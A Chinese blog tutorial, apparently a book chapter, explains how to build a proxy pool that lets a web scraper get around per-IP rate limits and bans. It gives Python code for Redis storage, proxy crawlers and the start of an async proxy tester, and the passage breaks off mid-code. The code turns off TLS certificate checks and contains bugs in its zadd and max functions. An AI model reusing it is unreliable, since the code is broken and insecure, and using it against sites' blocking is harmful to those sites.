    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/03/02/1xVdOgkM3P5HBRX.png" style="zoom:67%;" /><p>一些网站服务器会检测某个 IP 在单位时间内的请求次数，如果超过了指定的阈值，会直接拒绝服务。本章介绍代理池的搭建方法，解决爬虫封 IP 的烦恼。</p><span id="more"></span><p>构建一个高效的代理池，主要需要四个模块：</p><ul><li><strong>存储模块</strong>：负责存储爬下来的代理。首先要保证代理不重复，标识代理的的可用情况，其次要动态实时地处理每个代理，这里采用 Redis 的 Sorted Set，即有序集合来存储，它也是中心模块和基础模块；</li><li><strong>获取模块</strong>：负责定时在各大代理网站爬取代理。代理可用是免费的也可以是付费的，形式都是 IP 加端口，尽量从不同源爬取，尽量爬取高匿代理，爬取成功后将可用代理存储；</li><li><strong>检测模块</strong>：负责定时检测模块中的代理是否可用。需要设置一个检测链接，最好设置为要爬取的网站，更具针对性。对通用性代理则可以设为百度等。另外，需要标识代理状态，例如设置分数标识，100 代表可用，分数越低越不可用。经检测， 如果代理可用，则直接设为 100，因为代理可能不稳定，及时调用可用代理，也可以加 1 操作；如果代理不可用，则分数减 1，当分数减到一定阈值后，直接从存储模块中删除此代理；</li><li><strong>接口模块</strong>：用 API 提供对外服务的接口。直接连接数据库需要配置连接信息，提供一个 Web API 接口更安全方便。可以代理不止一个，可以设置一个随机返回某个可用代理的接口。</li></ul><p><strong>存储模块</strong>使用 Redis 的有序集合，每个元素都不重复，且有一个分数字段（可重复），集合会根据分数进行排序，如果要获取代理，可以从代理池中随机获取分数最高的代理。</p><p>分数的设置方案是初始为 10，如果经检测可用，则设为 100，提高可用代理的利用率，检测到不可用时，分数减 1，减至 0 后，删除代理。这里主要是考虑到免费代理的稳定性不高，可能有网络繁忙或其他人用此代理太过频繁，要尽可能提高可用代理的利用率；另外，新获取的代理无效的概率较大，可用的本就不多，初始便设为了 10，到弃用最多检测 10 次，减少开销。该思路不一定最优，但实测效果尚可。</p><p><code>./storages/redis.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> REDIS_CONNECTION_STRING, REDIS_HOST, REDIS_PORT, REDIS_PASSWORD, REDIS_DB, REDIS_KEY, \</span><br><span class="line">    PROXY_SCORE_MAX, PROXY_SCORE_MIN, PROXY_SCORE_INIT</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">from</span> proxypool.exceptions <span class="keyword">import</span> PoolEmptyException</span><br><span class="line"><span class="keyword">from</span> proxypool.util.proxy <span class="keyword">import</span> is_valid_proxy, convert_proxy_or_proxies</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List, Tuple</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">REDIS_CLIENT_VERSION = redis.__version__</span><br><span class="line">IS_REDIS_VERSION_2 = REDIS_CLIENT_VERSION.startswith(<span class="string">&#x27;2.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisClient</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD, db=REDIS_DB,</span></span></span><br><span class="line"><span class="function"><span class="params">                 connection_string=REDIS_CONNECTION_STRING, **kwargs</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        init redis client</span></span><br><span class="line"><span class="string">        :param host: redis host</span></span><br><span class="line"><span class="string">        :param port: redis port</span></span><br><span class="line"><span class="string">        :param password: redis password</span></span><br><span class="line"><span class="string">        :param db: redis db</span></span><br><span class="line"><span class="string">        :param connection_string: redis connection_string</span></span><br><span class="line"><span class="string">        :param kwargs:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> connection_string:</span><br><span class="line">            self.db = redis.StrictRedis.from_url(</span><br><span class="line">                connection_string, decode_responses=<span class="literal">True</span>, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.db = redis.StrictRedis(</span><br><span class="line">                host=host, port=port, password=password, db=db, decode_responses=<span class="literal">True</span>, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self, proxy: Proxy, score=PROXY_SCORE_INIT</span>) -&gt; [int, <span class="keyword">None</span>]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        add proxy and set it to init score</span></span><br><span class="line"><span class="string">        :param proxy: proxy - ip:port, like 8.8.8.8:8888</span></span><br><span class="line"><span class="string">        :param score: int score</span></span><br><span class="line"><span class="string">        :return: result[int, None]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_proxy(<span class="string">f&#x27;<span class="subst">&#123;proxy.host&#125;</span>:<span class="subst">&#123;proxy.port&#125;</span>&#x27;</span>):</span><br><span class="line">            logger.info(<span class="string">f&#x27;invalid proxy <span class="subst">&#123;proxy&#125;</span>, throw it&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.exists(proxy):</span><br><span class="line">            <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">                <span class="keyword">return</span> self.db.zadd(REDIS_KEY, score, proxy.string())</span><br><span class="line">            <span class="keyword">return</span> self.db.zadd(REDIS_KEY, &#123;proxy.string, score&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrease</span>(<span class="params">self, proxy: Proxy</span>) -&gt; int:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        decrease score of proxy, if less than PROXY_SCORE_MIN, delete it</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: new score</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">            self.db.zincrby(REDIS_KEY, proxy.string(), -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.db.zincrby(REDIS_KEY, -<span class="number">1</span>, proxy.string())</span><br><span class="line">        score = self.db.zscore(REDIS_KEY, proxy.string())</span><br><span class="line">        logger.info(<span class="string">f&#x27;<span class="subst">&#123;proxy.string()&#125;</span> score decrease 1, current <span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> score &lt; PROXY_SCORE_MIN:</span><br><span class="line">            logger.info(<span class="string">f&#x27;<span class="subst">&#123;proxy.string()&#125;</span> current score <span class="subst">&#123;score&#125;</span>, remove&#x27;</span>)</span><br><span class="line">            self.db.zrem(REDIS_KEY, proxy.string())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span>(<span class="params">self</span>) -&gt; Proxy:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        get random proxy</span></span><br><span class="line"><span class="string">        get proxy with max score firstly &gt;&gt; try to get proxy by rank &gt;&gt; raise error</span></span><br><span class="line"><span class="string">        :return: proxy</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># get proxy with max score firstly</span></span><br><span class="line">        proxies = self.db.zrangebyscore(REDIS_KEY, PROXY_SCORE_MAX, PROXY_SCORE_MAX)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(proxies):</span><br><span class="line">            <span class="keyword">return</span> convert_proxy_or_proxies(choice(proxies))</span><br><span class="line">        proxies = self.db.zrevrange(REDIS_KEY, PROXY_SCORE_MIN, PROXY_SCORE_MAX)</span><br><span class="line">        <span class="comment"># get proxy by rank</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(proxies):</span><br><span class="line">            <span class="keyword">return</span> convert_proxy_or_proxies(choice(proxies))</span><br><span class="line">        <span class="comment"># raise error</span></span><br><span class="line">        <span class="keyword">raise</span> PoolEmptyException</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exists</span>(<span class="params">self, proxy: Proxy</span>) -&gt; bool:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        if proxy exists</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> self.db.zscore(REDIS_KEY, proxy.string()) <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">max</span>(<span class="params">self, proxy: Proxy</span>) -&gt; int:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        set porxy to max score</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: new score</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        logger.info(<span class="string">f&#x27;<span class="subst">&#123;proxy.string()&#125;</span> is valid, set to <span class="subst">&#123;PROXY_SCORE_MAX&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">            <span class="keyword">return</span> self.db.zadd(REDIS_KEY, PROXY_SCORE_MAX, proxy.string())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">count</span>(<span class="params">self</span>) -&gt; int:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        get count of proxies</span></span><br><span class="line"><span class="string">        :return: count[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.db.zcard(REDIS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all</span>(<span class="params">self</span>) -&gt; List[Proxy]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        get all proxies</span></span><br><span class="line"><span class="string">        :return: list of proxies</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> convert_proxy_or_proxies(self.db.zrangebyscore(</span><br><span class="line">            REDIS_KEY, PROXY_SCORE_MIN, PROXY_SCORE_MAX))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TODO return type</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">batch</span>(<span class="params">self, cursor, count</span>) -&gt; Tuple[int, Proxy]:</span></span><br><span class="line">        cursor, proxies = self.db.zscan(REDIS_KEY, cursor, count=count)</span><br><span class="line">        <span class="keyword">return</span> cursor, convert_proxy_or_proxies([i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> proxies])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    conn = RedisClient()</span><br><span class="line">    result = conn.random()</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p><strong>获取模块</strong>负责从各大网站爬取代理并将代理存到存储模块，下面是一个示例代理类：</p><p><code>./crawlers/public/ip3366.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> proxypool.crawlers.base <span class="keyword">import</span> BaseCrawler</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas.proxy <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">MAX_PAGE = <span class="number">5</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://www.ip3366.net/free/?stype=1&amp;page=&#123;page&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP3366Crawler</span>(<span class="params">BaseCrawler</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ip3366 爬虫 http://www.ip3366.net</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    urls = [BASE_URL.<span class="built_in">format</span>(page=i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, html</span>):</span></span><br><span class="line">        ip_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;&#x27;</span>)</span><br><span class="line">        re_ip_address = ip_address.findall(html)</span><br><span class="line">        <span class="keyword">for</span> address, port <span class="keyword">in</span> re_ip_address:</span><br><span class="line">            proxy = Proxy(host=address, port=port)</span><br><span class="line">            <span class="keyword">yield</span> proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crawler = IP3366Crawler()</span><br><span class="line">    <span class="keyword">for</span> proxy <span class="keyword">in</span> crawler.crawl():</span><br><span class="line">        print(proxy)</span><br></pre></td></tr></table></figure><p>其父类 <code>BaseCrawler</code> 里定义了通用的页面爬取方法 <code>fetch</code>：</p><p><code>./crawlers/base.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry, RetryError</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> GET_TIMEOUT</span><br><span class="line"><span class="keyword">from</span> fake_headers <span class="keyword">import</span> Headers</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseCrawler</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    urls = []</span><br><span class="line"></span><br><span class="line"><span class="meta">    @retry(<span class="params">stop_max_attempt_number=<span class="number">3</span>, retry_on_result=<span class="keyword">lambda</span> x: x <span class="keyword">is</span> <span class="literal">None</span>, wait_fixed=<span class="number">2000</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fetch</span>(<span class="params">self, url, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = Headers(headers=<span class="literal">True</span>).generate()</span><br><span class="line">            kwargs.setdefault(<span class="string">&#x27;timeout&#x27;</span>, GET_TIMEOUT)</span><br><span class="line">            kwargs.setdefault(<span class="string">&#x27;verify&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">            kwargs.setdefault(<span class="string">&#x27;headers&#x27;</span>, headers)</span><br><span class="line">            response = requests.get(url, **kwargs)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                response.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">except</span> requests.ConnectionError:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span>(<span class="params">self, html, url</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        used for parse html, self.parse() is defined in inherited class</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> proxy <span class="keyword">in</span> self.parse(html):</span><br><span class="line">            logger.info(<span class="string">f&#x27;fetched proxy <span class="subst">&#123;proxy.string()&#125;</span> from <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">yield</span> proxy</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> self.urls:</span><br><span class="line">                logger.info(<span class="string">f&#x27;fetching <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">                html = self.fetch(url)</span><br><span class="line">                time.sleep(<span class="number">.5</span>)</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> self.process(html, url)</span><br><span class="line">        <span class="keyword">except</span> RetryError:</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">f&#x27;crawler <span class="subst">&#123;self&#125;</span> crawled proxy unsuccessfully, &#x27;</span></span><br><span class="line">                <span class="string">&#x27;please check if target url is valid or network issue&#x27;</span></span><br><span class="line">            )</span><br></pre></td></tr></table></figure><p>设置了通用爬取方法后，扩展代理类就很方便，只需继承该父类并实现 parse 解析方法即可。最后还需要将所有 Crawler 汇总起来，通过遍历检测是否是 BaseCrawler 的子类的方法，代码如下：</p><p><code>./crawlers/__init__.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pkgutil</span><br><span class="line"><span class="keyword">from</span> base <span class="keyword">import</span> BaseCrawler</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># load classes subclass of BaseCrawler</span></span><br><span class="line">classes = []</span><br><span class="line"><span class="keyword">for</span> loader, name, is_pkg <span class="keyword">in</span> pkgutil.walk_packages(__path__):</span><br><span class="line">    module = loader.find_module(name).load_module(name)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> inspect.getmembers(module):</span><br><span class="line">        <span class="built_in">globals</span>()[key] = value</span><br><span class="line">        <span class="keyword">if</span> inspect.isclass(value) <span class="keyword">and</span> <span class="built_in">issubclass</span>(value, BaseCrawler) <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">not</span> BaseCrawler \</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">getattr</span>(value, <span class="string">&#x27;ignore&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">            classes.append(value)</span><br><span class="line">__all__ = __ALL__ = classes</span><br></pre></td></tr></table></figure><p>使用 <code>walk_packages</code>方法遍历 <code>crawlers</code>模块下的类，判断是否是<code>BaseCrawler</code>的子类，是就加到 <code>classes</code> 中，后面只需将<code> classes</code>里的类依次实例化调用即可。</p><p><strong>检测模块</strong>使用了 <code>aiohttp</code>来检测，异步可以减少等待网页响应浪费的时间，提高检测效率，代码如下：</p><p><code>./processor/tester.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">from</span> proxypool.storages.redis <span class="keyword">import</span> RedisClient</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> TEST_TIMEOUT, TEST_BATCH, TEST_URL, TEST_VALID_STATUS, TEST_ANONYMOUS</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientProxyConnectionError, ServerDisconnectedError, ClientOSError, ClientHttpProxyError</span><br><span class="line"><span class="keyword">from</span> asyncio <span class="keyword">import</span> TimeoutError</span><br><span class="line"></span><br><span class="line">EXCEPTIONS = (</span><br><span class="line">    ClientProxyConnectionError,</span><br><span class="line">    ConnectionRefusedError,</span><br><span class="line">    TimeoutError,</span><br><span class="line">    ServerDisconnectedError,</span><br><span class="line">    ClientOSError,</span><br><span class="line">    ClientHttpProxyError,</span><br><span class="line">    AssertionError</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tester</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    tester for testing proxies in queue</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        init redis</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.redis = RedisClient()</span><br><span class="line">        self.loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self, proxy: Proxy</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        test single proxy</span></span><br><span class="line"><span class="string">        :param proxy: Proxy object</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=<span class="literal">False</span>)) <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                logger.debug(<span class="string">f&#x27;testing <span class="subst">&#123;proxy.string()&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="comment"># if TEST_ANONYMOUS is True, make sure that</span></span><br><span class="line">                <span class="comment"># the proxy has the effect of hiding the real IP</span></span><br><span class="line">                <span class="keyword">if</span> TEST_ANONYMOUS:</span><br><span class="line">                    url = <span class="string">&#x27;https://httpbin.org/ip&#x27;</span></span><br><span class="line">                    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url, timeout=TEST_TIMEOUT) <span class="keyword">as</span> response:</span><br><span class="line">                        resp_json = <span class="keyword">await</span> response.json()</span><br><span class="line">                        origin_ip = resp_json[<span class="string">&#x27;origin&#x27;</span>]</span><br><span class="line">                    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url, proxy=<span class="string">f&#x27;http://<span class="subst">&#123;proxy.string()&#125;</span>&#x27;</span>, timeout=TEST_TIMEOUT) <span class="keyword">as</span> response:</span><br><span 